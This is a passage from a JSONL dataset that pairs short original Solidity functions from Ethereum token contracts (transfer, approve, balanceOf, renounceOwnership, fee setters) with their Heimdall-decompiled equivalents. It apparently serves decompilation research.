address(msg.sender);\n        var_e = 0x01;\n        storage_map_c[var_d] = storage_map_c[var_d] - arg1;\n        var_d = address(arg0);\n        require(!(storage_map_c[var_d] > ~(arg1)), \"ERC20: transfer to the zero address\");\n        var_d = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x11;\n        var_d = address(arg0);\n        var_e = 0x01;\n        storage_map_c[var_d] = storage_map_c[var_d] + arg1;\n        uint256 var_f = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_f = 0x01;\n        return 0x01;\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_k = 0x20;\n        var_l = 0x23;\n        var_m = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_k = 0x20;\n        var_l = 0x25;\n        var_m = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x2bAa6759eF2a982BBf5619E21eC244eA7a2Ee3C4", "original_solidity_code": "function SetTotalFees(uint256 _fee) external onlyowner {\r\n        totalFee = _fee;\r\n    }", "heimdall_decompiled_code": "function SetTotalFees(uint256 arg0) public payable {\n        require(arg0 == arg0);\n        require(address(owner / 0x01) == (address(msg.sender)), \"only owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x0a;\n        var_e = 0x6f6e6c79206f776e657200000000000000000000000000000000000000000000;\n        totalFee = arg0;\n    }"}
{"contract_address": "0x3f91B8467d1eE998DE6344903e2fDEB6252d4c8b", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"SafeMath: multiplication overflow\");\n        require(address(arg0) - 0, \"SafeMath: multiplication overflow\");\n        require(arg1 > 0, \"SafeMath: multiplication overflow\");\n        require(!(!(address(msg.sender)) == (address(owner / 0x01))), \"SafeMath: multiplication overflow\");\n        require(!(!(address(arg0)) == (address(owner / 0x01))), \"SafeMath: multiplication overflow\");\n        require(store_b > store_c, \"SafeMath: multiplication overflow\");\n        require(!(store_b > store_c), \"SafeMath: multiplication overflow\");\n        require(!(!store_b > store_d), \"SafeMath: multiplication overflow\");\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (store_e == ((arg1 * store_e) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_e) / arg1) == store_e, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_h = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = 0x40 + var_e;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_h = var_e.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        require(0x64, \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        require(!(bytes1(transferDelayEnabled / 0x01)), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_g / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_h / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        address var_a = address(tx.origin);\n        var_n = 0x04;\n        require(storage_map_i[var_a] < block.number, \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x49;\n        var_l = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_o = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_p = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        var_a = address(tx.origin);\n        var_n = 0x04;\n        storage_map_i[var_a] = block.number;\n        require(!(address(msg.sender) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_n = 0x01;\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(((arg1 * store_e) / 0x64) > 0), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_n = 0x01;\n        require(!(storage_map_i[var_a] > (storage_map_i[var_a] + ((arg1 * store_e) / 0x64))), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(!(storage_map_i[var_a] + ((arg1 * store_e) / 0x64) < storage_map_i[var_a]), \"SafeMath: addition overflow\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x1b;\n        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_n = 0x01;\n        storage_map_i[var_a] = storage_map_i[var_a] + ((arg1 * store_e) / 0x64);\n        uint256 var_j = (arg1 * store_e) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (arg1 * store_e) / 0x64);\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        var_e = 0x40 + var_e;\n        var_j = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_i[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_i[var_a] - arg1) > storage_map_i[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        storage_map_i[var_a] = storage_map_i[var_a] - arg1;\n        var_e = 0x40 + var_e;\n        var_r = 0x1e;\n        var_s = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((arg1 * store_e) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_t = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_p = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_u = var_e.length;\n        uint256 var_v = 0;\n        var_w = var_m;\n        var_v = 0;\n        if (!(arg1 - ((arg1 * store_e) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_b = 0x11;\n            if (storage_map_i[var_a] > _maxTaxSwap) {\n            }\n            if (!storage_map_i[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_h / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_b > store_c) {\n                if (!store_b > store_l) {\n                    if (store_b > store_d) {\n                        if (arg1 - 0) {\n                            if (!arg1 | (store_e == ((arg1 * store_e) / arg1))) {\n                                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_b = 0x11;\n                                require(!((arg1 - ((arg1 * store_e) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n                            }\n                        }\n                        require(store_b > store_c, \"Exceeds the _maxTxAmount.\");\n                    }\n                }\n                require(!(!store_b > store_d), \"Exceeds the _maxTxAmount.\");\n            }\n            require(!arg1 | (store_e == ((arg1 * store_e) / arg1)), \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x19;\n        var_l = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(arg0) == (address(store_g / 0x01))) {\n            if (address(arg0) == (address(store_g / 0x01))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        if (!store_b > store_c) {\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xF3B054a111b9fd6fc5289F473e456531ee89Ba1c", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x693E9C1e8935caf91F006bf5a2FF8a1aB2C569c7", "original_solidity_code": "function howMuchMAGA(address shareholder) external view returns (uint256) {\r\n        return magaPrinter.getUnpaidEarnings(shareholder);\r\n    }", "heimdall_decompiled_code": "function howMuchMAGA(address arg0) public returns (uint256) {\n        require(arg0 == (address(arg0)));\n        var_a = 0x28fd319800000000000000000000000000000000000000000000000000000000;\n        address var_b = address(arg0);\n        (bool success, bytes memory ret0) = address(magaPrinter).Unresolved_28fd3198(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        uint256 var_d = var_c.length;\n        return var_c.length;\n    }"}
{"contract_address": "0xEC5Cd1764456f3CaBb72B90b95526BE632D8385c", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x693E9C1e8935caf91F006bf5a2FF8a1aB2C569c7", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_k[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x36c3C1D874fd543c139cF9dDBDF1a8fEe8301d16", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x1727A45a3E3bE7AdF4B185D80F0b4F557b755f87", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n        owner = 0 | (uint96(owner));\n    }"}
{"contract_address": "0x48df68e006d857d29C39030D2c3B1E0CBF5c6bf4", "original_solidity_code": "function openTrading() external {\r\n        require(msg.sender == deployer);\r\n        tradingOpened = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(0x32755345a47ccede41b29ec680e89640ded41764 == msg.sender);\n        store_b = 0x01 | (uint248(store_b));\n    }"}
{"contract_address": "0x1c6e35bFEA40f3709DA709f0f2e55604C1F53a1f", "original_solidity_code": "function activity(\r\n    address _r,\r\n    uint256 am\r\n    ) public onlyOwner {\r\n            uint256 amO = gAO(_RR.WETH(), am);\r\n            address[] memory p = getPP();\r\n            uint256 amI = _cAI(amO, p);\r\n            _doS(amO, amI, p, _r);\r\n    }", "heimdall_decompiled_code": "function activity(address arg0, uint256 arg1) public payable {\n        require(msg.sender == (address(owner)), \"Caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x43616c6c6572206973206e6f7420746865206f776e6572000000000000000000;\n        var_a = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        require(address(store_f).code.length);\n        (bool success, bytes memory ret0) = address(store_f).WETH(var_b); // staticcall\n        require(!ret0.length < 0x20);\n        var_a = 0x0902f1ac00000000000000000000000000000000000000000000000000000000;\n        require(address(store_b / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_b / 0x01).getReserves(var_b); // staticcall\n        require(!ret0.length < 0x60);\n        var_a = 0x0dfe168100000000000000000000000000000000000000000000000000000000;\n        require(address(store_b).code.length);\n        (bool success, bytes memory ret0) = address(store_b).token0(var_b); // staticcall\n        require(!ret0.length < 0x20);\n        require(address(var_e.length) == (address(var_e.length)));\n        var_a = 0x02;\n        uint256 var_e = var_e + 0x60;\n        var_f = msg.data[4:68];\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        require(address(store_f / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_i); // staticcall\n        require(!ret0.length < 0x20);\n        uint256 var_j = address(var_e.length);\n        var_h = 0x02;\n        var_e = var_e + 0x60;\n        var_f = msg.data[4:68];\n        var_k = 0x1f00ca7400000000000000000000000000000000000000000000000000000000;\n        uint256 var_l = (arg1 * (uint112(var_m))) / 0x0186a0;\n        var_n = 0x40;\n        uint256 var_o = var_e.length;\n        require(!0 < (var_e.length * 0x20));\n        require(address(store_f).code.length);\n        (bool success, bytes memory ret0) = address(store_f).Unresolved_1f00ca74(var_l); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!ret0.length < 0x20);\n        require(!var_e.length > 0x0100000000);\n        require(!((var_e + var_e.length) + 0x20) > (var_e + ret0.length));\n        require(!(var_p > 0x0100000000) | (((var_e + var_e.length) + 0x20) + (var_p * 0x20) > (var_e + ret0.length)));\n        var_q = var_p;\n        require(!0 < (0x20 * (var_p)));\n        var_e = (0x20 * (var_r)) + (0x20 + var_e);\n        require(block.timestamp > 0x01);\n        uint256 var_s = 0;\n        var_t = 0x04;\n        storage_map_g[var_s] = (var_m) + storage_map_g[var_s];\n        require(var_e.length);\n        var_s = address(this);\n        var_t = 0x04;\n        require(address(this));\n        require(address(store_f));\n        var_s = address(this);\n        var_t = 0x05;\n        var_s = address(store_f);\n        uint256 var_t = keccak256(var_s);\n        storage_map_g[var_s] = storage_map_g[var_s];\n        uint256 var_u = storage_map_g[var_s];\n        emit Approval(address(this), address(store_f), storage_map_g[var_s]);\n        var_u = 0x8803dbee00000000000000000000000000000000000000000000000000000000;\n        var_o = (arg1 * (uint112(var_m))) / 0x0186a0;\n        var_v = var_m;\n        address var_w = address(arg0);\n        uint256 var_x = 0x04b0 + block.timestamp;\n        uint256 var_y = (0x20 + (0x20 + (0x20 + (0x20 + (0x20 + (0x04 + var_e)))))) - (0x04 + var_e);\n        uint256 var_z = var_e.length;\n        require(!0 < (0x20 * var_e.length));\n        require(address(store_f / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_f / 0x01).{ value: 0 ether }Unresolved_8803dbee(var_o); // call\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!ret0.length < 0x20);\n        require(!var_e.length > 0x0100000000);\n        require(!((var_e + var_e.length) + 0x20) > (var_e + ret0.length));\n        require(!(var_p > 0x0100000000) | (((var_e + var_e.length) + 0x20) + (var_p * 0x20) > (var_e + ret0.length)));\n        var_aa = var_p;\n        require(!0 < (0x20 * (var_p)));\n        var_e = (0x20 * (var_r)) + (0x20 + var_e);\n        var_u = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_o = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_v = 0x22;\n        var_ab = this.code[5148:5182];\n        var_u = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_o = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_v = 0x24;\n        var_ab = this.code[5257:5293];\n    }"}
{"contract_address": "0x09c7dBaE0F40CBAA2BBd329397f1c5A64726a04a", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\\n        return _balances[account];\\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x46c4C3ef9A1557017955E74D4F3550971C2700A3", "original_solidity_code": "function checkRatio(uint256 ratio, uint256 accuracy) public view returns (bool) {\r\n        return showBacking(accuracy) > ratio;\r\n    }", "heimdall_decompiled_code": "function checkRatio(uint256 arg0, uint256 arg1) public view {\n        var_a = 0x06;\n        var_b = 0xdead;\n        uint256 var_c = 0x40 + var_c;\n        var_d = 0x1e;\n        var_e = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(store_s > totalSupply), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_h = var_c.length;\n        uint256 var_i = 0;\n        var_j = var_k;\n        var_i = 0;\n        require(!(totalSupply - store_s) > totalSupply);\n        var_b = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_l = 0x11;\n    }"}
{"contract_address": "0xF47024a2e10D77927767cBE5aADf5F8BB02782c9", "original_solidity_code": "function removeCoal(address account) public onlyOwner {\\r\\n        coal[account] = false;\\r\\n    }", "heimdall_decompiled_code": "function removeCoal(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_f = address(arg0);\n        var_g = 0x98;\n        storage_map_i[var_f] = (0 * 0x01) | (uint248(storage_map_i[var_f]));\n    }"}
{"contract_address": "0x531f60e490298A93bd6379E2cCe84E087818c93d", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return tokenFromReflection(_rOwned[account]);\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x02;\n        require(!(storage_map_l[var_a] > store_f), \"Amount must be less than total reflections\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x2a;\n        var_f = 0x416d6f756e74206d757374206265206c657373207468616e20746f74616c2072;\n        var_g = 0x65666c656374696f6e7300000000000000000000000000000000000000000000;\n        uint256 var_h = 0x40 + var_h;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x016345785d8a0000, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_h.length;\n        require(!(0 > var_h.length), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_k = 0;\n        var_l = var_m;\n        require(!(0x20 > var_h.length), \"SafeMath: division by zero\");\n        var_k = 0;\n        if (0x016345785d8a0000) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_n = 0x12;\n            require(0x016345785d8a0000);\n        }\n    }"}
{"contract_address": "0x159B1C899Ee968Db9E5e9c5adCD184a7B6052611", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0);\n        require(address(arg0) - 0);\n        require(arg1 > 0);\n        require(address(msg.sender) == (address(owner / 0x01)));\n        require(address(arg0) == (address(owner / 0x01)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a] / 0x01));\n        require(!bytes1(storage_map_b[var_a] / 0x01));\n        require(!(bytes1(transferDelayEnabled / 0x01)), \"Only one transfer per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_d / 0x01))), \"Only one transfer per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_e / 0x01))), \"Only one transfer per block allowed.\");\n        var_a = address(tx.origin);\n        var_b = 0x05;\n        require(storage_map_b[var_a] < block.number, \"Only one transfer per block allowed.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x4f6e6c79206f6e65207472616e736665722070657220626c6f636b20616c6c6f;\n        var_h = 0x7765642e00000000000000000000000000000000000000000000000000000000;\n        var_a = address(tx.origin);\n        var_b = 0x05;\n        storage_map_b[var_a] = block.number;\n        require(!(address(msg.sender) == (address(store_e / 0x01))), \"SafeMath: multiplication overflow\");\n        require(!(address(msg.sender) == (address(store_e / 0x01))), \"SafeMath: multiplication overflow\");\n        require(!(address(msg.sender) == (address(store_e / 0x01))), \"SafeMath: multiplication overflow\");\n        require(store_f > store_g, \"SafeMath: multiplication overflow\");\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (store_h == ((arg1 * store_h) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_h) / arg1) == store_h, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_h = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = 0x40 + var_e;\n        var_c = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_h = var_e.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x12;\n        require(!(address(arg0) == (address(store_e / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_e / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(((arg1 * store_h) / 0x64) > 0), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + ((arg1 * store_h) / 0x64))), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        require(!(storage_map_b[var_a] + ((arg1 * store_h) / 0x64) < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] + ((arg1 * store_h) / 0x64);\n        uint256 var_k = (arg1 * store_h) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (arg1 * store_h) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_e = 0x40 + var_e;\n        var_k = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), 